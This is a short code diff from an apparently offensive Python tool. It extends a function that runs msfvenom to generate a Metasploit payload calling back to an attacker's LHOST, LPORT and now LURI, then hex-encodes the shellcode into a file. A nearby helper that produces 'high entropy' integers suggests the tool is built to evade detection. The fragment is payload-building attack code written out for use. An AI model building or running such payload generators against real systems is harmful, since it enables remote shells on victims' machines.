@@ -142,7 +142,7 @@ def generate_high_entropy_int(min_val=0x1111, max_val=0xFFFF):
         if min_avg <= avg <= max_avg and min_total <= total <= max_total:  # Good distribution
             return num
         
-def generate_payload(payload, lhost, lport):
+def generate_payload(payload, lhost, lport, luri):
     print(f"msfvenom is generating payload for {payload} ...")
-    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw | xxd -p | tr -d '\\n' > temp/payload.txt"
+    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} LURI={luri} -f raw | xxd -p | tr -d '\\n' > temp/payload.txt"
     subprocess.run(command, shell=True, check=True)
